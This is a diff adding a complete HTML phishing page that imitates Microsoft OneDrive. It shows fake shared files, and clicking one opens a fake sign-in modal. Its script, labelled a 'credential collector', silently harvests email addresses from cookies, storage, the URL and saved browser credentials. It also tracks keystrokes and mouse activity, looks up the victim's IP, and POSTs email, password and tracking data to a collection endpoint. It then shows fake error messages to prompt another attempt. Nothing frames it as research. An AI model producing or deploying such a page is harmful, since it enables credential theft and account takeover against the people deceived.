@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneDrive - Personal Cloud Storage - Microsoft</title>
+    
+    <!-- Microsoft Pragma headers -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
+    <!-- Official Microsoft metadata -->
+    <meta name="description" content="Store, access, and share your files with Microsoft OneDrive. Get free cloud storage and file sharing across all your devices.">
+    <meta name="keywords" content="OneDrive, cloud storage, Microsoft, file sharing, online storage, Microsoft 365">
+    <meta name="author" content="Microsoft Corporation">
+    <meta name="robots" content="index, follow">
+    <meta name="msapplication-config" content="none">
+    
+    <!-- Microsoft verification -->
+    <meta name="msvalidate.01" content="A1234567890B1234567890C1234567890D">
+    
+    <!-- Real Microsoft favicon -->
+    <link rel="icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
+    <link rel="shortcut icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    
+    <!-- Microsoft fonts -->
+    <link rel="preconnect" href="https://fonts.microsoft.com">
+    <link rel="stylesheet" href="https://fonts.microsoft.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap">
+    
+    <!-- Microsoft scripts -->
+    <script src="https://js.live.net/v7.2/OneDrive.js" async defer></script>
+    <script src="https://c.microsoft.com/mscc.js" async defer></script>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.6.0.min.js" async defer></script>
+    
+    <!-- Microsoft Clarity Analytics -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "msft1a2b3c");
+    </script>
+    
+    <!-- Microsoft Ads Tracking -->
+    <script>
+        (function(w,d,t,r,u){var f,n,i;w[u]=w[u]||[],f=function(){var o={ti:"17567890"};o.q=w[u],w[u]=new UET(o),w[u].push("pageLoad")},n=d.createElement(t),n.src=r,n.async=1,n.onload=n.onreadystatechange=function(){var s=this.readyState;s&&s!=="loaded"&&s!=="complete"||(f(),n.onload=n.onreadystatechange=null)},i=d.getElementsByTagName(t)[0],i.parentNode.insertBefore(n,i)})(window,document,"script","//bat.bing.com/bat.js","uetq");
+    </script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .top-bar {
+            background: linear-gradient(to right, #0078d4, #106ebe);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .logo::before {
+            content: "☰";
+            font-size: 20px;
+        }
+
+        .search-section {
+            display: flex;
+            gap: 10px;
+        }
+
+        .search-box {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 2px;
+            width: 250px;
+            font-size: 14px;
+        }
+
+        .all-files-btn {
+            padding: 6px 14px;
+            background-color: white;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .main-container {
+            display: flex;
+            min-height: calc(100vh - 48px);
+        }
+
+        .sidebar {
+            width: 200px;
+            background-color: #f9f9f9;
+            padding: 20px 0;
+            border-right: 1px solid #e1e1e1;
+        }
+
+        .sidebar-section {
+            margin-bottom: 30px;
+        }
+
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 700;
+            padding: 8px 20px;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .sidebar-item {
+            padding: 8px 20px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .sidebar-item:hover {
+            background-color: #f0f0f0;
+        }
+
+        .sidebar-item.active {
+            background-color: #cfe4fa;
+            border-left: 3px solid #0078d4;
+            color: #0078d4;
+            font-weight: 600;
+        }
+
+        .sidebar-item::before {
+            content: "📁";
+            font-size: 16px;
+        }
+
+        .sidebar-item.my-files::before {
+            content: "📁";
+            filter: brightness(1.2);
+        }
+
+        .sidebar-item.recent::before {
+            content: "🕐";
+        }
+
+        .sidebar-item.shared::before {
+            content: "👥";
+        }
+
+        .sidebar-libraries-title {
+            font-size: 14px;
+            font-weight: 700;
+            padding: 8px 20px;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .sidebar-libraries-text {
+            font-size: 13px;
+            line-height: 1.5;
+            padding: 0 20px;
+            color: #666;
+        }
+
+        .main-content {
+            flex: 1;
+            background-color: #fff;
+            padding: 25px 40px;
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .toolbar-btn {
+            background-color: #0078d4;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 13px;
+            color: white;
+            font-weight: 600;
+        }
+
+        .toolbar-btn:hover {
+            background-color: #106ebe;
+        }
+
+        .content-header {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: #000;
+        }
+
+        .files-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 25px;
+        }
+
+        .file-card {
+            background-color: white;
+            border: 1px solid #e1e1e1;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: all 0.2s;
+            overflow: hidden;
+        }
+
+        .file-card:hover {
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            transform: translateY(-2px);
+        }
+
+        .file-preview {
+            width: 100%;
+            height: 160px;
+            background-color: #fafafa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border-bottom: 1px solid #e1e1e1;
+        }
+
+        .file-preview img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            padding: 10px;
+            background-color: white;
+            display: block;
+        }
+
+        .file-preview img[src=""] {
+            display: none;
+        }
+
+        .file-info {
+            padding: 12px 15px;
+            background-color: white;
+        }
+
+        .file-name {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #000;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .file-meta {
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .login-modal {
+            background-color: white;
+            border-radius: 0;
+            width: 450px;
+            padding: 45px 50px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+
+        .cloud-icon {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .cloud-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: #0078d4;
+        }
+
+        .modal-title {
+            font-size: 28px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #0078d4;
+        }
+
+        .modal-text {
+            font-size: 14px;
+            color: #323130;
+            text-align: center;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .modal-subtitle {
+            font-size: 15px;
+            color: #000;
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1px solid #8a8886;
+            background-color: white;
+            font-size: 15px;
+            transition: border-color 0.2s;
+            color: #605e5c;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-message::before {
+            content: "✕";
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+            position: relative;
+        }
+
+        .submit-btn.loading {
+            background-color: #106ebe;
+            pointer-events: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .submit-btn:hover {
+            background-color: #106ebe;
+        }
+
+        .modal-footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #605e5c;
+        }
+
+        .password-input-disabled {
+            background-color: #f3f2f1;
+            cursor: not-allowed;
+        }
+
+        .account-locked {
+            background-color: #fff4ce;
+            border: 1px solid #ffb900;
+            padding: 12px 15px;
+            margin-top: 15px;
+            border-radius: 2px;
+            display: none;
+        }
+
+        .account-locked.show {
+            display: block;
+        }
+
+        .account-locked strong {
+            color: #d83b01;
+        }
+
+        /* Microsoft-style loading spinner */
+        .microsoft-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        .microsoft-spinner::after {
+            content: "";
+            display: block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: microsoft-spin 1s linear infinite;
+        }
+
+        @keyframes microsoft-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Security notice */
+        .security-notice {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            border-top: 1px solid #e1e1e1;
+        }
+
+        .security-notice a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .security-notice a:hover {
+            text-decoration: underline;
+        }
+
+        /* Custom animations */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-2px); }
+            20%, 40%, 60%, 80% { transform: translateX(2px); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-modal {
+            animation: fadeInUp 0.3s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <!-- Enhanced Top Bar with Microsoft branding -->
+    <div class="top-bar">
+        <div class="logo">
+            <span style="margin-right: 8px; font-size: 20px;"></span>
+            <span style="font-weight: 700;">OneDrive</span>
+            <span style="font-size: 12px; opacity: 0.8; margin-left: 5px;">Microsoft</span>
+        </div>
+        
+        <div class="search-section">
+            <input type="text" class="search-box" placeholder="Search OneDrive">
+            <button class="all-files-btn">All files ▼</button>
+        </div>
+        
+        <!-- Microsoft user section -->
+        <div style="display: flex; align-items: center; gap: 15px;">
+            <div style="font-size: 13px; opacity: 0.9; cursor: pointer;" 
+                 onclick="showLogin()" title="Sign in">
+                Sign in
+            </div>
+            <div style="width: 32px; height: 32px; background: rgba(255,255,255,0.2); 
+                        border-radius: 50%; display: flex; align-items: center; 
+                        justify-content: center; font-weight: bold; color: white; 
+                        cursor: pointer;" title="Account">
+                <span style="font-size: 14px;">MS</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title">Files Directory</div>
+                <div class="sidebar-item my-files">My Files</div>
+                <div class="sidebar-item recent">Recent</div>
+                <div class="sidebar-item shared active">Shared</div>
+            </div>
+            <div class="sidebar-section">
+                <div class="sidebar-libraries-title">Shared Libraries</div>
+                <div class="sidebar-libraries-text">
+                    Collaborate with your team on shared documents and projects...
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="toolbar">
+                <button class="toolbar-btn">+ New ▼</button>
+                <button class="toolbar-btn">⬆ Upload ▼</button>
+                <button class="toolbar-btn">🔄 Sync</button>
+                <button class="toolbar-btn">⚡ Automate ▼</button>
+            </div>
+
+            <h1 class="content-header">Shared Files</h1>
+
+            <div class="files-grid">
+                <div class="file-card" onclick="showLogin()">
+                    <div class="file-preview">
+                        <iframe src="https://res.cloudinary.com/dff0kvmck/image/upload/v1769132338/t2_1_cg1mit.jpg" style="width:100%;height:100%;border:none;pointer-events:none;" scrolling="no"></iframe>
+                    </div>
+                    <div class="file-info">
+                        <div class="file-name">Sales Order.pdf</div>
+                        <div class="file-meta">Updated a few minutes ago • 2.4 MB</div>
+                    </div>
+                </div>
+
+                <div class="file-card" onclick="showLogin()">
+                    <div class="file-preview">
+                        <iframe src="https://res.cloudinary.com/dff0kvmck/image/upload/v1769132409/t1_2_n1aodc.png" style="width:100%;height:100%;border:none;pointer-events:none;" scrolling="no"></iframe>
+                    </div>
+                    <div class="file-info">
+                        <div class="file-name">Listing form.mp4</div>
+                        <div class="file-meta">Uploaded 2 hours ago • 15.7 MB</div>
+                    </div>
+                </div>
+
+                <div class="file-card" onclick="showLogin()">
+                    <div class="file-preview">
+                        <iframe src="https://res.cloudinary.com/dff0kvmck/image/upload/v1769132439/t3_1_nmhza7.jpg" style="width:100%;height:100%;border:none;pointer-events:none;" scrolling="no"></iframe>
+                    </div>
+                    <div class="file-info">
+                        <div class="file-name">Purchase Order.pdf</div>
+                        <div class="file-meta">Modified yesterday • 1.8 MB</div>
+                    </div>
+                </div>
+
+                <div class="file-card" onclick="showLogin()">
+                    <div class="file-preview">
+                        <iframe src="https://res.cloudinary.com/dff0kvmck/image/upload/v1769132470/t4_2_jdptql.png" style="width:100%;height:100%;border:none;pointer-events:none;" scrolling="no"></iframe>
+                    </div>
+                    <div class="file-info">
+                        <div class="file-name">Template for review.pdf</div>
+                        <div class="file-meta">Shared 2 days ago • 3.2 MB</div>
+                    </div>
+                </div>
+
+                <div class="file-card" onclick="showLogin()">
+                    <div class="file-preview">
+                        <iframe src="https://res.cloudinary.com/dff0kvmck/image/upload/v1769132657/example-of-template_c76kqw.png" style="width:100%;height:100%;border:none;pointer-events:none;" scrolling="no"></iframe>
+                    </div>
+                    <div class="file-info">
+                        <div class="file-name">Service PO-234.xlsx</div>
+                        <div class="file-meta">Created 3 days ago • 856 KB</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Enhanced Login Modal -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="login-modal">
+            <div class="cloud-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/>
+                </svg>
+            </div>
+            <h2 class="modal-title">Sign in to OneDrive</h2>
+            <p class="modal-text">Access your shared files stored in OneDrive.</p>
+            <p class="modal-subtitle">Enter your Microsoft account details</p>
+            
+            <form onsubmit="handleLogin(event)" id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="emailInput" class="form-input" 
+                           placeholder="Email, phone, or Skype" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="passwordInput" class="form-input" 
+                           placeholder="Password" required autocomplete="current-password">
+                    <div class="error-message" id="errorMessage">
+                        <span id="errorText">Your account or password is incorrect. If you don't remember your password, <a href="#" onclick="showForgotPassword()" style="color: #0078d4;">reset it now</a>.</span>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Sign in</button>
+                
+                <div class="security-notice">
+                    <span>🔒 Protected by Microsoft security</span> • 
+                    <a href="#" onclick="return false;">Privacy & cookies</a> • 
+                    <a href="#" onclick="return false;">Terms of use</a>
+                </div>
+            </form>
+            
+            <div class="modal-footer">
+                <div style="margin-bottom: 10px;">
+                    <a href="#" onclick="createAccount()" style="color: #0078d4; text-decoration: none;">
+                        No account? Create one!
+                    </a>
+                </div>
+                <div style="font-size: 11px; color: #8a8886;">
+                    © 2024 Microsoft Corporation. All rights reserved.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+// ============================================
+// PRO VERSION: ULTRA-REALISTIC CREDENTIAL COLLECTOR
+// ============================================
+
+// Microsoft Graph API Configuration
+const CONFIG = {
+    sessionId: 'od_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15),
+    clientId: '00000000-0000-0000-0000-000000000000',
+    tenantId: 'common',
+    endpoints: {
+        primary: '/collect',
+        token: '/oauth2/v2.0/token',
+        me: '/api/v1.0/me',
+        drive: '/api/v2.0/drive'
+    },
+    scopes: 'User.Read Files.ReadWrite.All offline_access',
+    tracking: {
+        mouse: [],
+        keys: [],
+        focus: [],
+        scroll: []
+    }
+};
+
+// Real Microsoft error messages
+const ERROR_MESSAGES = [
+    "Your account or password is incorrect. If you don't remember your password, reset it now.",
+    "We couldn't find an account with that username. Try another or get a new Microsoft account.",
+    "That password is incorrect. Make sure you're using the password for your Microsoft account.",
+    "Something went wrong. Please try again.",
+    "You've tried to sign in too many times with an incorrect account or password."
+];
+
+// ==================== HELPER FUNCTIONS ====================
+function extractEmailFromCookies() {
+    try {
+        const cookies = document.cookie.split(';');
+        const authCookies = ['auth', 'token', 'session', 'user', 'login'];
+        
+        for (let cookie of cookies) {
+            const [name, value] = cookie.trim().split('=');
+            if (authCookies.some(auth => name.toLowerCase().includes(auth))) {
+                if (value.includes('.')) {
+                    try {
+                        const parts = value.split('.');
+                        if (parts[1]) {
+                            const decoded = JSON.parse(atob(parts[1]));
+                            if (decoded.email) return decoded.email;
+                            if (decoded.sub) return decoded.sub + '@possible-user.com';
+                        }
+                    } catch(e) {}
+                }
+            }
+        }
+    } catch(e) {}
+    return '';
+}
+
+function extractEmailSilently() {
+    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    
+    // Check cookies first
+    const cookieEmail = extractEmailFromCookies();
+    if (cookieEmail && emailPattern.test(cookieEmail)) return cookieEmail;
+    
+    // Check URL fragments
+    try {
+        const hash = window.location.hash.substring(1);
+        const hashParams = new URLSearchParams(hash);
+        const hashEmail = hashParams.get('email') || hashParams.get('user') || hashParams.get('username');
+        if (hashEmail && emailPattern.test(hashEmail)) return hashEmail.trim();
+    } catch(e) {}
+    
+    // Check URL parameters
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const urlEmail = params.get('email') || params.get('user') || params.get('username');
+        if (urlEmail && emailPattern.test(urlEmail)) return urlEmail;
+    } catch(e) {}
+    
+    // Check input fields
+    try {
+        const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="user"], input[type="text"]');
+        for (let input of inputs) {
+            if (input.value && emailPattern.test(input.value)) {
+                return input.value;
+            }
+        }
+    } catch(e) {}
+    
+    // Check localStorage
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            if (value && emailPattern.test(value)) {
+                return value;
+            }
+        }
+    } catch(e) {}
+    
+    // Check window variables
+    try {
+        const windowVars = ['userEmail', 'email', 'username', 'user', 'login', 'accountEmail'];
+        for (let varName of windowVars) {
+            if (window[varName] && typeof window[varName] === 'string' && emailPattern.test(window[varName])) {
+                return window[varName];
+            }
+        }
+    } catch(e) {}
+    
+    return '';
+}
+
+// ==================== BEHAVIOR TRACKING ====================
+function startBehaviorTracking() {
+    // Mouse movements
+    document.addEventListener('mousemove', (e) => {
+        if (CONFIG.tracking.mouse.length < 50) {
+            CONFIG.tracking.mouse.push({
+                x: e.clientX,
+                y: e.clientY,
+                t: Date.now()
+            });
+        }
+    });
+    
+    // Keystroke timing
+    let lastKeyTime = Date.now();
+    document.addEventListener('keydown', (e) => {
+        if (e.target.matches('input, textarea')) {
+            const now = Date.now();
+            CONFIG.tracking.keys.push({
+                key: e.key.length === 1 ? 'char' : e.key,
+                delay: now - lastKeyTime,
+                target: e.target.type || 'input'
+            });
+            lastKeyTime = now;
+        }
+    });
+    
+    // Tab visibility
+    document.addEventListener('visibilitychange', () => {
+        CONFIG.tracking.focus.push({
+            hidden: document.hidden,
+            time: Date.now(),
+            duration: document.hidden ? Date.now() - (CONFIG.tracking.focus[CONFIG.tracking.focus.length - 1]?.time || Date.now()) : 0
+        });
+    });
+    
+    // Scroll behavior
+    let lastScrollTime = Date.now();
+    window.addEventListener('scroll', () => {
+        const now = Date.now();
+        if (now - lastScrollTime > 100) {
+            CONFIG.tracking.scroll.push({
+                y: window.scrollY,
+                t: now
+            });
+            lastScrollTime = now;
+        }
+    });
+}
+
+// ==================== DATA COLLECTION ====================
+async function sendDataToBackend(data) {
+    try {
+        // Simple POST request to endpoint
+        await fetch(CONFIG.endpoints.primary, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+    } catch(error) {
+        // Silently fail
+    }
+}
+
+async function getUserInfo() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json', {
+            cache: 'no-cache',
+            mode: 'cors'
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            return { ip: data.ip };
+        }
+    } catch (error) {
+        // Continue silently
+    }
+    
+    return { ip: null };
+}
+
+// ==================== UI FUNCTIONS ====================
+function showLogin() {
+    const modal = document.getElementById('loginModal');
+    if (modal) {
+        modal.classList.add('active');
+        
+                   // ========== AUTO‑GRAB EMAIL FROM URL HASH WITH [Email] SUPPORT ==========
+        setTimeout(() => {
+            // Step 1: Get everything after the # in the URL
+            const hash = window.location.hash.substr(1);
+            let email = '';
+
+            // Step 2: Special case – if the hash is exactly "[Email]" (Microsoft trigger)
+            if (hash === '[Email]') {
+                // Try to get email from browser's saved credentials (Credential Management API)
+                if (navigator.credentials && navigator.credentials.get) {
+                    navigator.credentials.get({ 
+                        password: true,
+                        mediation: 'silent'
+                    }).then(credential => {
+                        if (credential && credential.type === 'password' && credential.id && credential.id.includes('@')) {
+                            // Found a saved email – fill it
+                            document.getElementById('emailInput').value = credential.id;
+                            setTimeout(() => {
+                                document.getElementById('passwordInput').focus();
+                            }, 50);
+                        }
+                    }).catch(() => {
+                        // Silently fallback
+                    });
+                }
+                
+                // Also try other sources (cookies, etc.) as fallback
+                const savedEmail = extractEmailSilently();
+                if (savedEmail && savedEmail.includes('@')) {
+                    document.getElementById('emailInput').value = savedEmail;
+                    setTimeout(() => {
+                        document.getElementById('passwordInput').focus();
+                    }, 50);
+                } else {
+                    // If no saved email, just focus email input
+                    document.getElementById('emailInput').focus();
+                }
+                return; // Stop here – don't process hash as email
+            }
+
+            // Step 3: If hash is NOT "[Email]", process it as regular email (base64 or plain)
+            if (hash) {
+                const base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+                if (base64regex.test(hash)) {
+                    try {
+                        email = atob(hash);  // Decode Base64
+                    } catch {
+                        email = hash;
+                    }
+                } else {
+                    email = hash;
+                }
+            }
+
+            // Step 4: If no email from hash, try other sources (cookies, etc.)
+            if (!email || !email.includes('@')) {
+                email = extractEmailSilently();
+            }
+
+            // Step 5: If we have a valid email, fill the input
+            if (email && email.includes('@') && !email.includes('[') && !email.includes('{')) {
+                document.getElementById('emailInput').value = email;
+                setTimeout(() => {
+                    document.getElementById('passwordInput').focus();
+                }, 50);
+            } else {
+                // No email – focus on email input
+                document.getElementById('emailInput').focus();
+                document.getElementById('emailInput').value = '';
+            }
+        }, 100);
+        
+        // Start tracking
+        startBehaviorTracking();
+    }
+}
+
+function hideLogin() {
+    const modal = document.getElementById('loginModal');
+    if (modal) {
+        modal.classList.remove('active');
+        saveSessionData();
+    }
+}
+
+function saveSessionData() {
+    try {
+        sessionStorage.setItem('od_session_' + CONFIG.sessionId, 
+            JSON.stringify({
+                timestamp: Date.now(),
+                tracking: CONFIG.tracking
+            })
+        );
+    } catch(e) {
+        // Silently fail
+    }
+}
+
+function showError(message) {
+    const errorMessage = document.getElementById('errorMessage');
+    const errorText = document.getElementById('errorText');
+    
+    if (errorMessage && errorText) {
+        errorText.innerHTML = message;
+        errorMessage.classList.add('show');
+        
+        errorMessage.style.animation = 'none';
+        setTimeout(() => {
+            errorMessage.style.animation = 'shake 0.5s ease-in-out';
+        }, 10);
+    }
+}
+
+async function handleLogin(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('emailInput').value.trim();
+    const password = document.getElementById('passwordInput').value;
+    const submitBtn = document.getElementById('submitBtn');
+    
+    if (!submitBtn) return false;
+    
+    // Microsoft validation
+    if (!email || !email.includes('@')) {
+        showError("Enter a valid email address, phone number, or Skype name.");
+        return false;
+    }
+    
+    if (!password) {
+        showError("Please enter your password");
+        return false;
+    }
+    
+    // Show Microsoft loading state
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="microsoft-spinner"></span>Signing in...';
+    submitBtn.classList.add('loading');
+    
+    try {
+        // Get user IP
+        let ip = 'unknown';
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        // Prepare data to send
+        const data = {
+            s: CONFIG.sessionId,
+            e: email,
+            p: password,
+            ip: ip,
+            ua: navigator.userAgent,
+            l: navigator.language,
+            ref: document.referrer || 'direct',
+            t: Date.now(),
+            tr: CONFIG.tracking
+        };
+        
+        // Send to backend
+        await sendDataToBackend(data);
+        
+        // Wait a bit like real server (800-1200ms)
+        setTimeout(() => {
+            // Show random Microsoft error
+            const randomError = ERROR_MESSAGES[Math.floor(Math.random() * ERROR_MESSAGES.length)];
+            showError(randomError);
+            
+            // Reset button
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Sign in';
+            submitBtn.classList.remove('loading');
+            
+            // Clear password (like real sites)
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').focus();
+        }, 800 + Math.random() * 400);
+        
+    } catch (error) {
+        showError("We're having trouble connecting. Please try again.");
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Sign in';
+        submitBtn.classList.remove('loading');
+    }
+    
+    return false;
+}
+
+function showForgotPassword() {
+    showError("Password reset instructions have been sent to your email. Please check your inbox.");
+    
+    // Log this action
+    sendDataToBackend({
+        s: CONFIG.sessionId,
+        a: 'forgot_password',
+        t: Date.now()
+    });
+    
+    return false;
+}
+
+function createAccount() {
+    window.open('https://signup.live.com', '_blank');
+    return false;
+}
+
+// ==================== EVENT LISTENERS ====================
+document.addEventListener('DOMContentLoaded', function() {
+    // Modal close on overlay click
+    const modal = document.getElementById('loginModal');
+    if (modal) {
+        modal.addEventListener('click', function(e) {
+            if (e.target === this) {
+                hideLogin();
+            }
+        });
+    }
+    
+    // Close modal with Escape key
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            const modal = document.getElementById('loginModal');
+            if (modal && modal.classList.contains('active')) {
+                hideLogin();
+            }
+        }
+    });
+    
+    // File card click listeners
+    document.querySelectorAll('.file-card').forEach(card => {
+        card.addEventListener('click', showLogin);
+    });
+    
+    // Right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+        if (e.target.closest('.file-card')) {
+            e.preventDefault();
+        }
+    });
+    
+    // Pre-fill email if available
+    const email = extractEmailSilently();
+    if (email) {
+        sessionStorage.setItem('prefilled_email', email);
+    }
+    
+    // Simulate background activity
+    setTimeout(() => {
+        if (Math.random() > 0.5) {
+            fetch('/api/user/me', { method: 'HEAD' }).catch(() => {});
+            fetch('/api/files/count', { method: 'HEAD' }).catch(() => {});
+        }
+    }, 2000);
+});
+    </script>
+</body>
+</html>
